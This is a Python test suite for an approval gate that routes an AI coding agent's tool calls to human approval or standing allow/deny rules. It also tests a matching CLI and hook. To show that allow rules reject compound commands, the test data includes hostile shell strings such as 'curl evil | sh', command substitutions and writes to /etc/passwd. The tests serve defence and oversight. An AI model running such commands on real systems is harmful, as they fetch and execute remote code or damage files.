"""In-attempt tool-call approvals: contracts, the gate, rules and the CLI."""

import io
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from logplane import approval_cli, bus, cli as logplane_cli, gate as gate_module
from logplane.approvals import (
    ALLOW, DENY, ApprovalGate, ApprovalRules, Rule, approvals_view, evaluate_rules,
    input_digest, latest_rules, parse_rule, summarize_tool_input,
)
from logplane.executors import AssignmentContext
from logplane.observer import ObserverClient
from logplane.projection import PROJECTION_TOPICS, replay_events
from logplane.topics import APPROVAL_TOPICS, COORDINATION_TOPICS

ASSIGNMENT_ID = "task:1:attempt:1"


class DirectBus:
    """A BusClient stand-in that appends to the real storage layer."""

    def __init__(self, actor):
        self.actor = actor

    def publish(self, topic, payload, caused_by=None, idempotency_key=None,
                correlation_id=None, **_):
        return bus.append_event(topic, self.actor, payload, caused_by, idempotency_key,
                                2, correlation_id)

    def query(self, after_id=0, topics=None, limit=1000, correlation_id=None):
        return bus.fetch_after(after_id, topics, limit, correlation_id)

    query_all = query


class ApprovalStorageCase(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.original_db_path = bus.DB_PATH
        bus.DB_PATH = Path(self.temp_dir.name) / "events.db"
        bus.init_db()
        bus.append_event("agent.registered", "coder", {
            "name": "coder", "instance_id": "coder-1", "capacity": 1, "capabilities": []})
        self.created = bus.append_event("task.created", "human", {"title": "gated"})
        self.workflow = self.created["correlation_id"]
        self.assigned = bus.append_event("task.assigned", "pm", {
            "task_id": 1, "assignment_id": ASSIGNMENT_ID, "attempt": 1, "assignee": "coder",
            "worker_instance_id": "coder-1",
        }, caused_by=self.created["id"], idempotency_key=f"assign:{ASSIGNMENT_ID}")
        self.worker = DirectBus("coder")
        self.human = DirectBus("human")

    def tearDown(self):
        bus.DB_PATH = self.original_db_path
        self.temp_dir.cleanup()

    def call(self, **changes):
        payload = {
            "task_id": 1, "assignment_id": ASSIGNMENT_ID, "worker_instance_id": "coder-1",
            "approval_id": f"{ASSIGNMENT_ID}:c1", "tool_name": "Bash",
            "summary": "git push", "input_digest": input_digest({"command": "git push"}),
        }
        payload.update(changes)
        return payload

    def request(self, **changes):
        return self.worker.publish("approval.requested", self.call(**changes),
                                   caused_by=self.assigned["id"])

    def resolve(self, request, actor="human", decision=ALLOW, **extra):
        payload = {"task_id": 1, "assignment_id": ASSIGNMENT_ID,
                   "approval_id": request["payload"]["approval_id"], "decision": decision}
        payload.update(extra)
        return DirectBus(actor).publish("approval.resolved", payload, caused_by=request["id"])

    def set_rules(self, allow=(), deny=(), actor="human"):
        return DirectBus(actor).publish("approval.rules_set", {
            "allow": [parse_rule(text).to_dict() for text in allow],
            "deny": [parse_rule(text).to_dict() for text in deny],
            "reason": "test rules",
        }, correlation_id=self.workflow)

    def gate(self, **options):
        options.setdefault("wait_seconds", 5)
        options.setdefault("sleep", lambda seconds: None)
        return ApprovalGate(self.worker, task_id=1, assignment_id=ASSIGNMENT_ID,
                            assignment_event_id=self.assigned["id"],
                            worker_instance_id="coder-1", correlation_id=self.workflow,
                            **options)


class ApprovalContractTests(ApprovalStorageCase):
    def test_approval_topics_stay_out_of_coordination_replay(self):
        self.assertEqual(set(), set(APPROVAL_TOPICS) & set(COORDINATION_TOPICS))
        self.assertEqual(set(), set(APPROVAL_TOPICS) & set(PROJECTION_TOPICS))

    def test_a_request_inherits_the_workflow_and_leaves_the_task_running(self):
        request = self.request()
        self.assertEqual(self.workflow, request["correlation_id"])
        state = replay_events(bus.fetch_after(0, list(PROJECTION_TOPICS)))
        self.assertEqual("assigned", state.tasks[1].status)
        self.assertEqual(ASSIGNMENT_ID, state.tasks[1].assignment_id)

    def test_only_the_worker_holding_the_assignment_may_request(self):
        for actor, changes, cause in (
            ("mallory", {}, self.assigned["id"]),
            ("coder", {"worker_instance_id": "coder-2"}, self.assigned["id"]),
            ("coder", {"assignment_id": "task:1:attempt:9"}, self.assigned["id"]),
            ("coder", {"task_id": 2}, self.assigned["id"]),
            ("coder", {}, self.created["id"]),
        ):
            with self.subTest(actor=actor, changes=changes, cause=cause):
                with self.assertRaises(bus.EventValidationError):
                    DirectBus(actor).publish("approval.requested", self.call(**changes),
                                             caused_by=cause)

    def test_request_payload_shape_is_exact(self):
        for changes in ({"extra": 1}, {"input_digest": "abc"}, {"summary": "x" * 501},
                        {"tool_name": ""}):
            with self.subTest(changes=changes):
                with self.assertRaises(bus.EventValidationError):
                    self.request(**changes)
        with self.assertRaises(bus.EventValidationError):
            self.worker.publish("approval.requested", self.call())  # no caused_by

    def test_an_agent_cannot_resolve_its_own_request(self):
        request = self.request()
        with self.assertRaisesRegex(bus.EventValidationError, "agent that requested it"):
            self.resolve(request, actor="coder")
        self.assertEqual("human", self.resolve(request)["actor"])

    def test_a_request_is_resolved_at_most_once(self):
        request = self.request()
        self.resolve(request, decision=DENY, reason="not tonight")
        with self.assertRaisesRegex(bus.EventValidationError, "already resolved"):
            self.resolve(request, decision=ALLOW)
        self.assertEqual(1, len(bus.fetch_after(0, ["approval.resolved"])))

    def test_a_resolution_must_match_a_real_request(self):
        request = self.request()
        with self.assertRaises(bus.EventValidationError):
            self.human.publish("approval.resolved", {
                "task_id": 1, "assignment_id": ASSIGNMENT_ID, "approval_id": "other",
                "decision": ALLOW}, caused_by=request["id"])
        with self.assertRaises(bus.EventValidationError):
            self.human.publish("approval.resolved", {
                "task_id": 1, "assignment_id": ASSIGNMENT_ID,
                "approval_id": request["payload"]["approval_id"], "decision": ALLOW,
            }, caused_by=self.assigned["id"])
        with self.assertRaises(bus.EventValidationError):
            self.resolve(request, decision="maybe")

    def test_rules_need_an_existing_workflow(self):
        with self.assertRaises(bus.EventValidationError):
            self.human.publish("approval.rules_set",
                               {"allow": [], "deny": [], "reason": "x"},
                               correlation_id="no-such-workflow")
        with self.assertRaises(bus.EventValidationError):
            self.human.publish("approval.rules_set",
                               {"allow": [{"tool": ""}], "deny": [], "reason": "x"},
                               correlation_id=self.workflow)

    def test_an_agent_cannot_apply_rules_it_set_itself(self):
        own = self.set_rules(allow=["Bash"], actor="coder")
        applied = {**self.call(), "decision": ALLOW, "rules_event_id": own["id"], "rule": "Bash"}
        with self.assertRaisesRegex(bus.EventValidationError, "set itself"):
            self.worker.publish("approval.rule_applied", applied, caused_by=own["id"])
        real = self.set_rules(allow=["Bash"])
        applied["rules_event_id"] = real["id"]
        self.assertEqual(real["id"], self.worker.publish(
            "approval.rule_applied", applied, caused_by=real["id"])["caused_by"])

    def test_an_agent_cannot_answer_its_own_decision(self):
        blocked = bus.append_event("task.blocked", "coder", {
            "task_id": 1, "assignment_id": ASSIGNMENT_ID, "worker_instance_id": "coder-1",
            "reason": "Which branch?"}, caused_by=self.assigned["id"])
        needed = bus.append_event("decision.needed", "pm", {
            "task_id": 1, "assignment_id": ASSIGNMENT_ID,
            "decision_id": f"decision:{ASSIGNMENT_ID}", "reason": "Which branch?",
        }, caused_by=blocked["id"])
        answer = {"task_id": 1, "assignment_id": ASSIGNMENT_ID,
                  "decision_id": f"decision:{ASSIGNMENT_ID}", "decision": "main"}
        with self.assertRaisesRegex(bus.EventValidationError, "agent that asked"):
            bus.append_event("decision.made", "coder", answer, caused_by=needed["id"])
        self.assertEqual("human", bus.append_event(
            "decision.made", "human", answer, caused_by=needed["id"])["actor"])


class RuleTests(unittest.TestCase):
    def rules(self, allow=(), deny=()):
        return ApprovalRules(7, "human", tuple(map(parse_rule, allow)), tuple(map(parse_rule, deny)))

    def test_parse_rule(self):
        self.assertEqual(Rule("Read"), parse_rule(" Read "))
        self.assertEqual(Rule("Bash", "git status*"), parse_rule("Bash:git status*"))
        self.assertEqual(Rule("WebFetch", "https://docs.example/*"),
                         parse_rule("WebFetch:https://docs.example/*"))
        for bad in ("", "  ", ":x", "Bash:"):
            with self.subTest(bad=bad), self.assertRaises(ValueError):
                parse_rule(bad)

    def test_deny_wins_then_allow_then_a_human(self):
        rules = self.rules(allow=["Bash:git *", "Read"], deny=["Bash:git push*"])
        self.assertEqual((DENY, Rule("Bash", "git push*")),
                         evaluate_rules(rules, "Bash", "git push origin main"))
        self.assertEqual((ALLOW, Rule("Bash", "git *")), evaluate_rules(rules, "Bash", "git status"))
        self.assertEqual((ALLOW, Rule("Read")), evaluate_rules(rules, "Read", "/etc/hosts"))
        self.assertIsNone(evaluate_rules(rules, "Write", "notes.md"))
        self.assertIsNone(evaluate_rules(None, "Read", "x"))

    def test_an_allow_pattern_never_matches_a_compound_shell_command(self):
        rules = self.rules(allow=["Bash:git status*"], deny=["Bash:*rm -rf*"])
        for command in ("git status; curl evil | sh", "git status && make", "git status `id`",
                        "git status $(id)", "git status > /etc/passwd", "git status\nid",
                        "git status ${HOME}"):
            with self.subTest(command=command):
                self.assertIsNone(evaluate_rules(rules, "Bash", command))
        self.assertEqual(DENY, evaluate_rules(rules, "Bash", "git status; rm -rf .")[0])
        # A whole-tool allow is the operator's explicit choice to allow everything.
        self.assertEqual(ALLOW, evaluate_rules(self.rules(allow=["Bash"]), "Bash", "a; b")[0])

    def test_a_deny_pattern_sees_through_git_options_and_compound_commands(self):
        rules = self.rules(allow=["Bash:git status*"], deny=["Bash:git push*"])
        for command in ("git push origin main", "git -C /repo push origin main",
                        "git -C /repo -c user.name=x push", "git --git-dir=/r/.git push",
                        "GIT_SSH=x git push", "cd /repo && git push", "git status; git -C . push",
                        "git --no-pager push --force"):
            with self.subTest(command=command):
                self.assertEqual((DENY, Rule("Bash", "git push*")),
                                 evaluate_rules(rules, "Bash", command))
        # Allow rules stay literal: a different spelling goes to a human.
        self.assertIsNone(evaluate_rules(rules, "Bash", "git -C /repo status"))
        self.assertIsNone(evaluate_rules(rules, "Bash", "git stash push"))
        self.assertEqual(ALLOW, evaluate_rules(
            self.rules(allow=["Bash:git -C * status"]), "Bash", "git -C /repo status")[0])
        # Not a git command: nothing is rewritten.
        self.assertIsNone(evaluate_rules(rules, "Bash", "echo git push"))

    def test_summaries_and_digests(self):
        self.assertEqual("ls -la", summarize_tool_input("Bash", {"command": "ls -la"}))
        self.assertEqual("src/a.py", summarize_tool_input("Edit", {"file_path": "src/a.py", "old": 1}))
        self.assertEqual("https://x.test", summarize_tool_input("WebFetch", {"url": "https://x.test"}))
        self.assertEqual('{"a":1}', summarize_tool_input("Custom", {"a": 1}))
        self.assertEqual("", summarize_tool_input("Custom", None))
        self.assertEqual(input_digest({"a": 1, "b": 2}), input_digest({"b": 2, "a": 1}))
        self.assertNotEqual(input_digest({"a": 1}), input_digest({"a": 2}))

    def test_latest_rules_replace_as_a_whole_and_skip_the_excluded_actor(self):
        def rules_event(event_id, actor, allow):
            return {"id": event_id, "topic": "approval.rules_set", "actor": actor,
                    "payload": {"allow": allow, "deny": [], "reason": "r"}}
        events = [rules_event(3, "human", [{"tool": "Read"}]),
                  rules_event(5, "human", [{"tool": "Grep"}]),
                  rules_event(9, "coder", [{"tool": "Bash"}]),
                  rules_event(11, "human", "malformed")]
        self.assertEqual((5, (Rule("Grep"),)),
                         (lambda r: (r.event_id, r.allow))(latest_rules(events, exclude_actor="coder")))
        self.assertEqual(9, latest_rules(events).event_id)
        self.assertIsNone(latest_rules([]))


class ApprovalGateTests(ApprovalStorageCase):
    def test_a_human_answer_reaches_the_waiting_call(self):
        for decision in (ALLOW, DENY):
            with self.subTest(decision=decision):
                answered = []

                def answer(_seconds, decision=decision):
                    if not answered:
                        pending = [row for row in approvals_view(bus.fetch_after(0, list(APPROVAL_TOPICS)))
                                   if row["status"] == "pending"]
                        request = bus.fetch_event(pending[0]["request_event_id"])
                        answered.append(self.resolve(request, decision=decision, reason="because"))

                result = self.gate(sleep=answer).check("Bash", {"command": "git push"})
                self.assertEqual((decision, "human"), (result.decision, result.source))
                self.assertIn("because", result.reason)
                self.assertEqual(answered[0]["id"], result.event_id)

    def test_nobody_answering_is_a_denial(self):
        ticks = iter(range(0, 100, 2))
        result = self.gate(wait_seconds=5, clock=lambda: next(ticks)).check("Bash", {"command": "x"})
        self.assertEqual((DENY, "timeout"), (result.decision, result.source))
        self.assertEqual("pending", approvals_view(
            bus.fetch_after(0, list(APPROVAL_TOPICS)))[0]["status"])

    def test_standing_rules_settle_calls_without_a_human_and_are_recorded(self):
        rules = self.set_rules(allow=["Bash:git status*"], deny=["Bash:git push*"])
        gate = self.gate()
        allowed = gate.check("Bash", {"command": "git status"}, call_id="a")
        denied = gate.check("Bash", {"command": "git push"}, call_id="b")
        self.assertEqual([(ALLOW, "rule"), (DENY, "rule")],
                         [(r.decision, r.source) for r in (allowed, denied)])
        applied = bus.fetch_after(0, ["approval.rule_applied"])
        self.assertEqual([rules["id"]] * 2, [event["caused_by"] for event in applied])
        self.assertEqual(["Bash:git status*", "Bash:git push*"],
                         [event["payload"]["rule"] for event in applied])
        self.assertEqual([], bus.fetch_after(0, ["approval.requested"]))

    def test_rules_set_under_the_workers_own_actor_are_ignored(self):
        self.set_rules(allow=["Bash"], actor="coder")
        ticks = iter(range(0, 100, 3))
        result = self.gate(clock=lambda: next(ticks)).check("Bash", {"command": "id"})
        self.assertEqual((DENY, "timeout"), (result.decision, result.source))

    def test_an_answer_recorded_by_the_worker_itself_is_never_accepted(self):
        # Even if a forged resolution reached history, the gate ignores it.
        forged = []

        def forge(_seconds):
            if not forged:
                request = bus.fetch_after(0, ["approval.requested"])[0]
                with patch.object(bus, "_check_approval_references", lambda *a, **k: None):
                    forged.append(self.resolve(request, actor="coder"))

        ticks = iter(range(0, 100, 2))
        result = self.gate(sleep=forge, clock=lambda: next(ticks)).check("Bash", {"command": "id"})
        self.assertTrue(forged)
        self.assertEqual((DENY, "timeout"), (result.decision, result.source))
        row = approvals_view(bus.fetch_after(0, list(APPROVAL_TOPICS)))[0]
        self.assertEqual("pending", row["status"])

    def test_a_bus_failure_is_a_denial_not_an_exception(self):
        import httpx

        class Down(DirectBus):
            def query_all(self, **_):
                raise httpx.ConnectError("down")

        gate = self.gate()
        gate.bus = Down("coder")
        result = gate.check("Bash", {"command": "id"})
        self.assertEqual((DENY, "error"), (result.decision, result.source))
        self.assertEqual(DENY, self.gate().check("", {}).decision)

    def test_a_stopped_attempt_stops_waiting(self):
        result = self.gate(should_stop=lambda: True).check("Bash", {"command": "id"})
        self.assertEqual((DENY, "error"), (result.decision, result.source))

    def test_long_inputs_are_truncated_for_display_but_digested_whole(self):
        command = "echo " + "x" * 2000
        self.set_rules(allow=["Bash:echo *"])
        self.assertTrue(self.gate().check("Bash", {"command": command}).allowed)
        payload = bus.fetch_after(0, ["approval.rule_applied"])[0]["payload"]
        self.assertEqual(500, len(payload["summary"]))
        self.assertEqual(input_digest({"command": command}), payload["input_digest"])

    def test_view_reports_expired_requests_once_the_attempt_has_ended(self):
        self.request()
        events = bus.fetch_after(0, list(APPROVAL_TOPICS))
        self.assertEqual("pending", approvals_view(
            events, active_assignments={ASSIGNMENT_ID: 1}, now=events[0]["ts"] + 3)[0]["status"])
        self.assertEqual("expired", approvals_view(events, active_assignments={})[0]["status"])

    def test_for_assignment_copies_the_attempt_identity(self):
        assignment = AssignmentContext(
            correlation_id=self.workflow, task_id=1, assignment_id=ASSIGNMENT_ID,
            assignment_event_id=self.assigned["id"], attempt=1, goal="g", assignee="coder",
            worker_instance_id="coder-1")
        gate = ApprovalGate.for_assignment(self.worker, assignment, wait_seconds=1)
        self.assertEqual((1, ASSIGNMENT_ID, self.assigned["id"], "coder-1", self.workflow),
                         (gate.task_id, gate.assignment_id, gate.assignment_event_id,
                          gate.worker_instance_id, gate.correlation_id))
        environment = gate_module.gate_environment(
            assignment, bus_url="http://127.0.0.1:8765", actor="coder", wait_seconds=30)
        rebuilt = gate_module.gate_from_environment(
            environment, bus_factory=lambda url, actor: DirectBus(actor))
        self.assertEqual((gate.task_id, gate.assignment_id, gate.assignment_event_id,
                          gate.worker_instance_id, gate.correlation_id, 30.0, "coder"),
                         (rebuilt.task_id, rebuilt.assignment_id, rebuilt.assignment_event_id,
                          rebuilt.worker_instance_id, rebuilt.correlation_id,
                          rebuilt.wait_seconds, rebuilt.bus.actor))


class ClaudeHookTests(ApprovalStorageCase):
    def hook(self, stdin, gate=None, environment=None):
        out = io.StringIO()
        code = gate_module.run_claude_hook(io.StringIO(stdin), out, environment or {}, gate=gate)
        self.assertEqual(0, code)
        return json.loads(out.getvalue())["hookSpecificOutput"]

    def test_the_hook_prints_the_gates_decision(self):
        self.set_rules(allow=["Bash:git status"], deny=["Write"])
        call = {"hook_event_name": "PreToolUse", "tool_name": "Bash",
                "tool_input": {"command": "git status"}, "tool_use_id": "toolu_1"}
        allowed = self.hook(json.dumps(call), gate=self.gate())
        self.assertEqual(("PreToolUse", "allow"),
                         (allowed["hookEventName"], allowed["permissionDecision"]))
        denied = self.hook(json.dumps({**call, "tool_name": "Write", "tool_use_id": "toolu_2",
                                       "tool_input": {"file_path": "a"}}), gate=self.gate())
        self.assertEqual("deny", denied["permissionDecision"])
        self.assertIn("standing deny rule", denied["permissionDecisionReason"])
        self.assertEqual(f"{ASSIGNMENT_ID}:toolu_1",
                         bus.fetch_after(0, ["approval.rule_applied"])[0]["payload"]["approval_id"])

    def test_anything_the_hook_cannot_establish_is_a_denial(self):
        for stdin, environment in (
            ("not json", {}),
            ("[]", {}),
            (json.dumps({"tool_input": {}}), {}),
            (json.dumps({"tool_name": "Bash"}), {}),  # no LOGPLANE_GATE_* variables
            (json.dumps({"tool_name": "Bash"}), {"LOGPLANE_GATE_URL": "http://127.0.0.1:1",
                                                 "LOGPLANE_GATE_ACTOR": "coder",
                                                 "LOGPLANE_GATE_TASK_ID": "one",
                                                 "LOGPLANE_GATE_ASSIGNMENT_ID": "a",
                                                 "LOGPLANE_GATE_ASSIGNMENT_EVENT_ID": "3",
                                                 "LOGPLANE_GATE_WORKER_INSTANCE_ID": "w"}),
        ):
            with self.subTest(stdin=stdin, environment=sorted(environment)):
                self.assertEqual("deny", self.hook(stdin, environment=environment)["permissionDecision"])

    def test_the_hook_marks_itself_as_waiting_only_while_it_waits(self):
        waiting = Path(self.temp_dir.name) / "waiting"
        waiting.mkdir()
        seen = []

        class Watching:
            wait_seconds = 30

            def check(self, *args, **kwargs):
                seen.append(gate_module.approval_pending(waiting))
                return self_gate.check(*args, **kwargs)

        self.set_rules(allow=["Read"])
        self_gate = self.gate()
        self.hook(json.dumps({"tool_name": "Read", "tool_input": {"file_path": "a"}}),
                  gate=Watching(), environment={"LOGPLANE_GATE_WAITING_DIR": str(waiting)})
        self.assertEqual([True], seen)
        self.assertFalse(gate_module.approval_pending(waiting))
        (waiting / "stale.wait").write_text("1.0")
        (waiting / "junk.wait").write_text("not a number")
        self.assertFalse(gate_module.approval_pending(waiting))
        self.assertFalse(gate_module.approval_pending(waiting / "missing"))

    def test_the_cli_exposes_the_hook(self):
        out = io.StringIO()
        with patch("sys.stdin", io.StringIO("not json")), patch.dict("os.environ", {}, clear=False):
            self.assertEqual(0, logplane_cli.main(["gate", "claude-hook"], stdout=out))
        self.assertEqual("deny", json.loads(out.getvalue())["hookSpecificOutput"]["permissionDecision"])


class StoredLog:
    """ObserverClient's read methods over the real storage layer."""

    iter_events = ObserverClient.iter_events

    def health(self):
        events = bus.fetch_after(0, None, 10_000)
        return {"ok": True, "last_event_id": events[-1]["id"] if events else 0}

    def query(self, *, after_id=0, topics=None, limit=1000, correlation_id=None):
        return bus.fetch_after(after_id, topics, limit, correlation_id)

    query_all = query

    def close(self):
        pass


class ApprovalCliTests(ApprovalStorageCase):
    def run_cli(self, *argv):
        out, err = io.StringIO(), io.StringIO()

        def publish(_args, intent):
            try:
                return bus.append_event(
                    intent["topic"], intent["actor"], intent["payload"], intent.get("caused_by"),
                    intent.get("idempotency_key"), intent["schema_version"],
                    intent.get("correlation_id"))
            except bus.EventValidationError as exc:
                import httpx
                request = httpx.Request("POST", "http://bus/events")
                raise httpx.HTTPStatusError("refused", request=request, response=httpx.Response(
                    422, json={"detail": str(exc)}, request=request)) from exc

        with patch.object(approval_cli, "_publish", publish):
            code = logplane_cli.main(["--url", "http://bus", *argv], stdout=out, stderr=err,
                                     client_factory=lambda url, token=None: StoredLog(),
                                     clock=lambda: self.assigned["ts"] + 10)
        return code, out.getvalue(), err.getvalue()

    def test_list_approve_and_deny(self):
        first, second = self.request(), self.request(approval_id="b", summary="rm -rf build")
        code, out, _ = self.run_cli("approvals")
        self.assertEqual(0, code)
        self.assertIn(f"#{first['id']} pending · task 1 · coder wants Bash", out)
        self.assertIn(f"logplane approve {first['id']}", out)
        self.assertIn("rm -rf build", out)

        code, out, _ = self.run_cli("approve", str(first["id"]))
        self.assertEqual(0, code, out)
        self.assertIn("Approved Bash for task 1", out)
        code, out, _ = self.run_cli("deny", str(second["id"]), "--reason", "too risky", "--json")
        self.assertEqual(("deny", "too risky"),
                         (lambda p: (p["decision"], p["reason"]))(json.loads(out)["payload"]))

        code, out, _ = self.run_cli("approvals", "--json")
        self.assertEqual([], json.loads(out)["approvals"])
        code, out, _ = self.run_cli("approvals", "--all", "--json")
        self.assertEqual(["allowed", "denied"], [row["status"] for row in json.loads(out)["approvals"]])
        self.assertEqual(["human", "human"], [row["resolved_by"] for row in json.loads(out)["approvals"]])

    def test_refusals_are_explained(self):
        request = self.request()
        self.assertEqual(0, self.run_cli("approve", str(request["id"]))[0])
        code, _, err = self.run_cli("deny", str(request["id"]), "--reason", "late",
                                    "--idempotency-key", "second")
        self.assertEqual(4, code)
        self.assertIn("already resolved", err)
        code, _, err = self.run_cli("approve", str(self.assigned["id"]))
        self.assertEqual(2, code)
        self.assertIn("is not an approval request", err)

    def test_an_expired_request_cannot_be_answered(self):
        request = self.request()
        bus.append_event("task.cancel_requested", "human", {"task_id": 1, "reason": "stop"})
        bus.append_event("task.cancelled", "pm", {
            "task_id": 1, "cancel_request_event_id": 5, "reason": "stop",
            "last_assignment_id": ASSIGNMENT_ID, "attempts": 1}, caused_by=5)
        code, out, err = self.run_cli("approve", str(request["id"]))
        self.assertEqual((4, ""), (code, out))
        self.assertIn("has expired", err)
        self.assertEqual([], bus.fetch_after(0, ["approval.resolved"]))

    def test_retrying_the_same_answer_is_idempotent(self):
        request = self.request()
        first = json.loads(self.run_cli("approve", str(request["id"]), "--json")[1])
        again = json.loads(self.run_cli("approve", str(request["id"]), "--json")[1])
        self.assertEqual(first["id"], again["id"])

    def test_ended_attempts_are_not_listed_as_waiting(self):
        self.request()
        bus.append_event("task.cancel_requested", "human", {"task_id": 1, "reason": "stop"})
        bus.append_event("task.cancelled", "pm", {
            "task_id": 1, "cancel_request_event_id": 5, "reason": "stop",
            "last_assignment_id": ASSIGNMENT_ID, "attempts": 1}, caused_by=5)
        self.assertEqual([], json.loads(self.run_cli("approvals", "--json")[1])["approvals"])
        rows = json.loads(self.run_cli("approvals", "--all", "--json")[1])["approvals"]
        self.assertEqual(["expired"], [row["status"] for row in rows])

    def test_rules_show_set_and_clear(self):
        code, out, _ = self.run_cli("approval-rules", self.workflow)
        self.assertIn("no standing rules", out)
        code, out, err = self.run_cli("approval-rules", self.workflow, "--allow", "Read",
                                      "--allow", "Bash:git status*", "--deny", "Bash:git push*",
                                      "--reason", "overnight")
        self.assertEqual(0, code, err)
        self.assertIn("1 deny, 2 allow", out)
        shown = json.loads(self.run_cli("approval-rules", self.workflow, "--json")[1])
        self.assertEqual([{"tool": "Bash", "input": "git push*"}], shown["deny"])
        self.assertEqual([{"tool": "Read"}, {"tool": "Bash", "input": "git status*"}], shown["allow"])
        self.assertEqual("human", shown["set_by"])

        for argv in (("--allow", "Read"), ("--clear", "--allow", "Read", "--reason", "x"),
                     ("--allow", "Bash:", "--reason", "x")):
            with self.subTest(argv=argv):
                self.assertEqual(2, self.run_cli("approval-rules", self.workflow, *argv)[0])
        self.assertEqual(0, self.run_cli("approval-rules", self.workflow, "--clear",
                                         "--reason", "done")[0])
        self.assertIn("no standing rules", self.run_cli("approval-rules", self.workflow)[1])


if __name__ == "__main__":
    unittest.main()
